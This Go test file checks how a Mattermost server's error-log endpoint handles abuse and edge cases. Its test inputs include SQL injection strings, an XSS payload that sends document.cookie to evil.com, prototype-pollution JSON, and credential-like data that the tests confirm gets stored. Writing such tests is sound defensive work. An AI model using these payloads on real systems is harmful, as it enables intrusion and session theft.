// Copyright (c) 2015-present Mattermost, Inc. All Rights Reserved.
// See LICENSE.txt for license information.

package api4

// mattermost-extended-test

import (
	"context"
	"encoding/json"
	"net/http"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/mattermost/mattermost/server/public/model"
)

// ----------------------------------------------------------------------------
// ERROR LOG ABUSE & EDGE CASES
// ----------------------------------------------------------------------------

func TestErrorLogPayloadInjection(t *testing.T) {
	th := Setup(t).InitBasic(t)

	th.App.UpdateConfig(func(cfg *model.Config) {
		cfg.FeatureFlags.ErrorLogDashboard = true
	})

	t.Run("SQL injection in error message field", func(t *testing.T) {
		report := &model.ErrorLogReport{
			Type:    model.ErrorLogTypeJS,
			Message: "'; DROP TABLE posts; --",
		}
		resp, err := th.Client.DoAPIPostJSON(context.Background(), "/errors", report)
		checkStatusCode(t, resp, err, http.StatusOK)
		closeIfOpen(resp, err)
	})

	t.Run("SQL injection in stack trace field", func(t *testing.T) {
		report := &model.ErrorLogReport{
			Type:    model.ErrorLogTypeJS,
			Message: "test",
			Stack:   "Error\n    at ' UNION SELECT * FROM sessions --",
		}
		resp, err := th.Client.DoAPIPostJSON(context.Background(), "/errors", report)
		checkStatusCode(t, resp, err, http.StatusOK)
		closeIfOpen(resp, err)
	})

	t.Run("SQL injection in URL field", func(t *testing.T) {
		report := &model.ErrorLogReport{
			Type:    model.ErrorLogTypeAPI,
			Message: "API error",
			Url:     "/api/v4/posts' OR '1'='1",
			Extra:   `{"method":"GET","status_code":500}`,
		}
		resp, err := th.Client.DoAPIPostJSON(context.Background(), "/errors", report)
		checkStatusCode(t, resp, err, http.StatusOK)
		closeIfOpen(resp, err)
	})

	t.Run("XSS in component_stack field", func(t *testing.T) {
		report := &model.ErrorLogReport{
			Type:           model.ErrorLogTypeJS,
			Message:        "render error",
			ComponentStack: `<div onload="fetch('https://evil.com?c='+document.cookie)">`,
		}
		resp, err := th.Client.DoAPIPostJSON(context.Background(), "/errors", report)
		checkStatusCode(t, resp, err, http.StatusOK)
		closeIfOpen(resp, err)
	})

	t.Run("JSON injection in extra field", func(t *testing.T) {
		report := &model.ErrorLogReport{
			Type:    model.ErrorLogTypeAPI,
			Message: "API error",
			Extra:   `{"method":"GET","status_code":500,"injected":"value","__proto__":{"admin":true}}`,
		}
		resp, err := th.Client.DoAPIPostJSON(context.Background(), "/errors", report)
		checkStatusCode(t, resp, err, http.StatusOK)
		closeIfOpen(resp, err)
	})

	t.Run("Null bytes in error fields", func(t *testing.T) {
		report := &model.ErrorLogReport{
			Type:    model.ErrorLogTypeJS,
			Message: "test\x00injected\x00null\x00bytes",
		}
		resp, err := th.Client.DoAPIPostJSON(context.Background(), "/errors", report)
		checkStatusCode(t, resp, err, http.StatusOK)
		closeIfOpen(resp, err)
	})

	t.Run("Credential-like data in request_payload is stored", func(t *testing.T) {
		// Clear existing errors
		resp, err := th.SystemAdminClient.DoAPIDelete(context.Background(), "/errors")
		closeIfOpen(resp, err)

		report := &model.ErrorLogReport{
			Type:           model.ErrorLogTypeAPI,
			Message:        "401 Unauthorized",
			Url:            "/api/v4/users/login",
			Extra:          `{"method":"POST","status_code":401}`,
			RequestPayload: `{"login_id":"admin@example.com","password":"SuperSecret123!"}`,
			ResponseBody:   `{"id":"api.user.login.invalid_credentials","message":"Invalid credentials"}`,
		}
		resp, err = th.Client.DoAPIPostJSON(context.Background(), "/errors", report)
		checkStatusCode(t, resp, err, http.StatusOK)
		closeIfOpen(resp, err)

		// Verify it's stored and visible to admin
		resp, err = th.SystemAdminClient.DoAPIGet(context.Background(), "/errors", "")
		checkStatusCode(t, resp, err, http.StatusOK)
		defer closeIfOpen(resp, err)

		var response map[string]any
		decErr := json.NewDecoder(resp.Body).Decode(&response)
		require.NoError(t, decErr)
		errors := response["errors"].([]any)
		require.GreaterOrEqual(t, len(errors), 1)
		// Credentials are stored in the error log — this is a data leak concern
		found := false
		for _, e := range errors {
			errMap := e.(map[string]any)
			if payload, ok := errMap["request_payload"].(string); ok {
				if strings.Contains(payload, "SuperSecret123!") {
					found = true
					break
				}
			}
		}
		assert.True(t, found, "Credentials in request_payload are stored in error logs")
	})
}

func TestErrorLogSpam(t *testing.T) {
	th := Setup(t).InitBasic(t)

	th.App.UpdateConfig(func(cfg *model.Config) {
		cfg.FeatureFlags.ErrorLogDashboard = true
	})

	t.Run("Rapid sequential error submissions are all accepted (no rate limit)", func(t *testing.T) {
		for i := 0; i < 50; i++ {
			report := &model.ErrorLogReport{
				Type:    model.ErrorLogTypeJS,
				Message: "spam error",
			}
			resp, err := th.Client.DoAPIPostJSON(context.Background(), "/errors", report)
			checkStatusCode(t, resp, err, http.StatusOK)
			closeIfOpen(resp, err)
		}
	})

	t.Run("Very large stack trace is accepted", func(t *testing.T) {
		report := &model.ErrorLogReport{
			Type:    model.ErrorLogTypeJS,
			Message: "stack overflow",
			Stack:   strings.Repeat("    at SomeFunction (file.js:1:1)\n", 10000),
		}
		resp, err := th.Client.DoAPIPostJSON(context.Background(), "/errors", report)
		checkStatusCode(t, resp, err, http.StatusOK)
		closeIfOpen(resp, err)
	})
}

func TestErrorLogEdgeCases(t *testing.T) {
	th := Setup(t).InitBasic(t)

	th.App.UpdateConfig(func(cfg *model.Config) {
		cfg.FeatureFlags.ErrorLogDashboard = true
	})

	t.Run("Unicode and emoji in error message", func(t *testing.T) {
		report := &model.ErrorLogReport{
			Type:    model.ErrorLogTypeJS,
			Message: "エラーが発生しました 🔥💥 Ошибка произошла",
		}
		resp, err := th.Client.DoAPIPostJSON(context.Background(), "/errors", report)
		checkStatusCode(t, resp, err, http.StatusOK)
		closeIfOpen(resp, err)
	})

	t.Run("Malformed JSON in extra field does not crash", func(t *testing.T) {
		report := &model.ErrorLogReport{
			Type:    model.ErrorLogTypeAPI,
			Message: "API error",
			Extra:   `{not valid json`,
		}
		resp, err := th.Client.DoAPIPostJSON(context.Background(), "/errors", report)
		// Should be accepted (extra is just a string field)
		checkStatusCode(t, resp, err, http.StatusOK)
		closeIfOpen(resp, err)
	})
}
